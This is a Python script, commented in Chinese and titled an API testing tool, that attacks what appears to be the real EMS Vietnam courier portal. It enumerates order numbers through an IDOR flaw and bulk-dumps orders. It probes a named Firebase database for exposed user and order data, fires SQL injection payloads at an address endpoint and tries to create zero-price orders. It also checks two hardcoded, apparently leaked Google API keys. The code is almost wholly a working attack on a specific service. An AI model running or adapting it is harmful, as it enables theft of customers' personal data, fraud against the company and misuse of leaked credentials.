#!/usr/bin/env python3
"""
EMS Vietnam Portal - API自动化测试工具
"""

import requests
import json
import time
from typing import Optional, Dict, List
import argparse

class EMSAPITester:
    def __init__(self, token: Optional[str] = None):
        self.base_url = "http://ws.ems.com.vn"
        self.token = token
        self.session = requests.Session()
        
    def set_token(self, token: str):
        """设置Bearer Token"""
        self.token = token
        
    def _headers(self) -> Dict[str, str]:
        """生成请求头"""
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "EMS Portal/1.0 (Android)"
        }
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        return headers
    
    def login(self, username: str, password: str) -> Optional[str]:
        """登录获取Token"""
        print(f"[*] 尝试登录: {username}")
        
        data = {
            "username": username,
            "password": password,
            "device_ime": "exploit_test",
            "device_type": "android"
        }
        
        try:
            resp = self.session.post(
                f"{self.base_url}/auth/login",
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            result = resp.json()
            if result.get("success"):
                self.token = result["data"]["token"]
                print(f"[+] 登录成功！Token: {self.token[:20]}...")
                return self.token
            else:
                print(f"[-] 登录失败: {result.get('message')}")
                return None
                
        except Exception as e:
            print(f"[-] 登录异常: {str(e)}")
            return None
    
    def test_idor_tracking(self, start_id: int = 100000000, count: int = 100):
        """测试IDOR - 订单追踪"""
        print(f"\n[*] 测试IDOR漏洞 (订单追踪)")
        print(f"[*] 范围: EMS{start_id}VN ~ EMS{start_id+count}VN")
        
        found = []
        for i in range(start_id, start_id + count):
            order_id = f"EMS{i}VN"
            
            try:
                resp = self.session.get(
                    f"{self.base_url}/api/v1/orders/tracking/{order_id}",
                    headers=self._headers(),
                    timeout=5
                )
                
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("success"):
                        print(f"[+] 找到有效订单: {order_id}")
                        found.append({
                            "order_id": order_id,
                            "data": data.get("data", {})
                        })
                        
            except Exception as e:
                pass
            
            time.sleep(0.3)  # 避免触发速率限制
        
        print(f"\n[*] 发现 {len(found)} 个有效订单")
        return found
    
    def dump_orders(self, limit: int = 1000):
        """批量导出订单"""
        print(f"\n[*] 尝试导出订单 (limit={limit})")
        
        try:
            resp = self.session.get(
                f"{self.base_url}/api/v1/orders/list",
                params={"limit": limit, "offset": 0},
                headers=self._headers(),
                timeout=30
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("success"):
                    orders = data.get("data", {}).get("orders", [])
                    print(f"[+] 成功导出 {len(orders)} 条订单")
                    return orders
            
            print(f"[-] 导出失败: {resp.status_code}")
            return []
            
        except Exception as e:
            print(f"[-] 异常: {str(e)}")
            return []
    
    def test_firebase(self):
        """测试Firebase未授权访问"""
        print(f"\n[*] 测试Firebase数据库")
        
        firebase_url = "https://ems-khl-app-notify.firebaseio.com"
        endpoints = [
            "/.json",
            "/orders/.json",
            "/users/.json",
            "/notifications/.json",
            "/merchants/.json"
        ]
        
        results = {}
        for ep in endpoints:
            try:
                resp = requests.get(f"{firebase_url}{ep}", timeout=10)
                if resp.status_code == 200 and resp.text != "null":
                    print(f"[+] 发现数据: {ep}")
                    results[ep] = resp.json()
                else:
                    print(f"[-] 无权限或无数据: {ep}")
            except Exception as e:
                print(f"[-] 错误 {ep}: {str(e)}")
        
        return results
    
    def test_sql_injection(self):
        """SQL注入探测"""
        print(f"\n[*] SQL注入探测")
        
        payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' AND SLEEP(5)--",
            "1' OR 1=1--"
        ]
        
        endpoint = f"{self.base_url}/api/v1/orders/suggest-address"
        
        for payload in payloads:
            print(f"[*] 测试: {payload}")
            
            start = time.time()
            try:
                resp = self.session.post(
                    endpoint,
                    json={"keyword": payload},
                    headers=self._headers(),
                    timeout=10
                )
                elapsed = time.time() - start
                
                if elapsed > 4:
                    print(f"[!] 可能存在时间盲注 (延迟: {elapsed:.2f}s)")
                    
            except Exception as e:
                print(f"[-] 异常: {str(e)}")
            
            time.sleep(1)
    
    def test_price_manipulation(self):
        """价格篡改测试"""
        print(f"\n[*] 价格篡改测试")
        
        test_order = {
            "sender_name": "Exploit Test",
            "sender_phone": "0123456789",
            "receiver_name": "Test Receiver",
            "receiver_phone": "0987654321",
            "weight": 10000,  # 10kg
            "price": 0,       # 尝试零元
            "fee": 1          # 运费1越南盾
        }
        
        try:
            resp = self.session.post(
                f"{self.base_url}/api/v1/orders/create",
                json=test_order,
                headers=self._headers(),
                timeout=10
            )
            
            print(f"[*] 响应状态: {resp.status_code}")
            print(f"[*] 响应内容: {resp.text[:200]}")
            
        except Exception as e:
            print(f"[-] 异常: {str(e)}")
    
    def test_google_api_keys(self):
        """测试泄露的Google API Key"""
        print(f"\n[*] 验证泄露的Google API Key")
        
        keys = [
            "AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY",
            "AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc"
        ]
        
        for key in keys:
            print(f"[*] 测试Key: {key[:20]}...")
            
            try:
                resp = requests.get(
                    "https://maps.googleapis.com/maps/api/place/nearbysearch/json",
                    params={
                        "location": "10.762622,106.660172",
                        "radius": 1000,
                        "key": key
                    },
                    timeout=10
                )
                
                if resp.status_code == 200:
                    data = resp.json()
                    if "results" in data:
                        print(f"[+] API Key有效且可用！")
                        print(f"[+] 返回结果数: {len(data['results'])}")
                    else:
                        print(f"[-] API Key受限: {data.get('error_message')}")
                else:
                    print(f"[-] 请求失败: {resp.status_code}")
                    
            except Exception as e:
                print(f"[-] 异常: {str(e)}")
    
    def full_scan(self):
        """完整扫描"""
        print("\n" + "="*60)
        print("EMS Vietnam Portal - 完整漏洞扫描")
        print("="*60)
        
        # 1. Firebase测试
        self.test_firebase()
        
        # 2. Google API Key测试
        self.test_google_api_keys()
        
        if not self.token:
            print("\n[!] 需要登录才能继续测试")
            return
        
        # 3. IDOR测试
        orders = self.test_idor_tracking(count=50)
        
        # 4. 批量导出
        all_orders = self.dump_orders(limit=100)
        
        # 5. SQL注入
        self.test_sql_injection()
        
        # 6. 价格篡改
        self.test_price_manipulation()
        
        print("\n" + "="*60)
        print("扫描完成")
        print("="*60)


def main():
    parser = argparse.ArgumentParser(description='EMS Portal API测试工具')
    parser.add_argument('-u', '--username', help='登录用户名')
    parser.add_argument('-p', '--password', help='登录密码')
    parser.add_argument('-t', '--token', help='已有Token')
    parser.add_argument('--test', choices=[
        'login', 'idor', 'dump', 'firebase', 'sql', 'price', 'google', 'full'
    ], default='full', help='测试类型')
    
    args = parser.parse_args()
    
    tester = EMSAPITester(token=args.token)
    
    # 如果提供了用户名密码，先登录
    if args.username and args.password:
        tester.login(args.username, args.password)
    
    # 执行测试
    if args.test == 'login':
        if args.username and args.password:
            tester.login(args.username, args.password)
    elif args.test == 'idor':
        tester.test_idor_tracking()
    elif args.test == 'dump':
        tester.dump_orders()
    elif args.test == 'firebase':
        tester.test_firebase()
    elif args.test == 'sql':
        tester.test_sql_injection()
    elif args.test == 'price':
        tester.test_price_manipulation()
    elif args.test == 'google':
        tester.test_google_api_keys()
    elif args.test == 'full':
        tester.full_scan()


if __name__ == "__main__":
    main()
